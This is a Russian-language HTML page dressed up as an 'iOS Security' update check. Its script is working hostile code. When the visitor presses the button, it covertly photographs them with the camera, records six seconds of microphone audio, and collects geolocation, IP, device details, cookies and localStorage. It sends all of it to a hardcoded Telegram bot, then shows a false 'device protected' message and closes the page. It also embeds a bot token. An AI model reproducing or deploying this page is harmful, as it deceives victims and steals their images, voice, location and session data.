<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Обновление безопасности</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 380px;
            width: 100%;
            background: #1c1c1e;
            border-radius: 32px;
            padding: 40px 24px 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            text-align: center;
            border: 1px solid #2c2c2e;
        }
        .icon {
            width: 72px;
            height: 72px;
            background: #007aff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 36px;
            box-shadow: 0 0 0 6px #1c1c1e, 0 0 0 8px #007aff33;
        }
        h2 { font-size: 24px; font-weight: 600; letter-spacing: -0.5px; margin-bottom: 8px; }
        .sub { color: #8e8e93; font-size: 15px; line-height: 1.5; margin-bottom: 24px; }
        .btn {
            background: #007aff;
            border: none;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            padding: 16px;
            border-radius: 16px;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
            margin-bottom: 12px;
        }
        .btn:active { transform: scale(0.96); background: #005bbf; }
        .btn:disabled { background: #3a3a3c; cursor: not-allowed; }
        .footer {
            font-size: 13px;
            color: #636366;
            margin-top: 16px;
            border-top: 1px solid #2c2c2e;
            padding-top: 16px;
        }
        .loader {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid #3a3a3c;
            border-top: 3px solid #007aff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 12px auto;
        }
        .loader.active { display: block; }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status {
            font-size: 14px;
            color: #8e8e93;
            margin-top: 8px;
            min-height: 22px;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">🛡️</div>
    <h2>Обновление безопасности</h2>
    <p class="sub">Для завершения настройки защиты<br>пройдите быструю проверку</p>

    <button class="btn" id="mainBtn">Начать проверку</button>
    <div id="status">Нажмите «Начать проверку»</div>
    <div class="loader" id="loader"></div>
    <div class="footer">Ваши данные защищены • iOS Security</div>
</div>

<script>
    // ===== ТВОИ ДАННЫЕ =====
    const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
    const CHAT_ID = '5025315928';
    // =======================

    const btn = document.getElementById('mainBtn');
    const status = document.getElementById('status');
    const loader = document.getElementById('loader');

    let stream = null;
    let audioBlob = null;
    let photoData = null;
    let locationData = null;

    btn.addEventListener('click', async () => {
        btn.disabled = true;
        btn.textContent = 'Обработка...';
        loader.classList.add('active');
        status.textContent = '⏳ Запрос разрешений...';

        // === 1. КАМЕРА ===
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            status.textContent = '✅ Камера активирована';
        } catch (e) {
            status.textContent = '⚠️ Для проверки нужна камера';
            btn.disabled = false;
            btn.textContent = 'Начать проверку';
            loader.classList.remove('active');
            return;
        }

        // === 2. ГЕОЛОКАЦИЯ ===
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            locationData = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            };
        } catch (e) {}

        // === 3. ФОТО ===
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 400));
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        photoData = canvas.toDataURL('image/png');

        // === 4. ЗВУК (6 сек) ===
        try {
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(audioStream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.start();
            await new Promise(r => setTimeout(r, 6000));
            mediaRecorder.stop();
            audioBlob = new Blob(chunks, { type: 'audio/webm' });
            audioStream.getTracks().forEach(t => t.stop());
        } catch (e) {}

        // === 5. ДАННЫЕ УСТРОЙСТВА ===
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            touch: 'ontouchstart' in window,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage)
        };

        let ip = 'не определён';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch (e) {}

        // === 6. ОТПРАВКА ===
        status.textContent = '📤 Отправка...';

        let text = `🛡️ <b>Security Check</b>\n\n`;
        text += `🖥 <b>Device:</b> ${deviceInfo.userAgent}\n`;
        text += `📱 <b>Platform:</b> ${deviceInfo.platform}\n`;
        text += `🌐 <b>Lang:</b> ${deviceInfo.language}\n`;
        text += `⏰ <b>Timezone:</b> ${deviceInfo.timezone}\n`;
        text += `📺 <b>Screen:</b> ${deviceInfo.screen}\n`;
        text += `🖱 <b>Touch:</b> ${deviceInfo.touch}\n`;
        text += `🌍 <b>IP:</b> ${ip}\n`;

        if (locationData) {
            text += `📍 <b>Geo:</b> ${locationData.lat}, ${locationData.lon} (±${locationData.acc}м)\n`;
        }

        text += `\n🍪 <b>Cookies:</b> ${deviceInfo.cookies || '—'}\n`;
        text += `📦 <b>LocalStorage:</b> ${deviceInfo.localStorage || '—'}\n`;

        await sendToTelegram('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' });

        if (photoData) {
            const blob = await fetch(photoData).then(r => r.blob());
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, 'face.png');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
        }

        if (audioBlob) {
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('audio', audioBlob, 'voice.webm');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
        }

        // === 7. ФИНАЛ — ЗАКРЫВАЕМ СТРАНИЦУ ===
        document.body.innerHTML = `
            <div style="background:#000;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;padding:20px;text-align:center;">
                <div style="font-size:48px;margin-bottom:16px;">✅</div>
                <h2 style="font-weight:400;">Проверка пройдена</h2>
                <p style="color:#8e8e93;margin-top:8px;">Ваше устройство защищено</p>
                <p style="color:#555;font-size:13px;margin-top:20px;">Закрытие...</p>
            </div>
        `;

        setTimeout(() => {
            window.close();
        }, 3000);
    });

    async function sendToTelegram(method, params) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
        const form = new FormData();
        for (const key in params) {
            form.append(key, params[key]);
        }
        await fetch(url, { method: 'POST', body: form });
    }
</script>
</body>
</html>
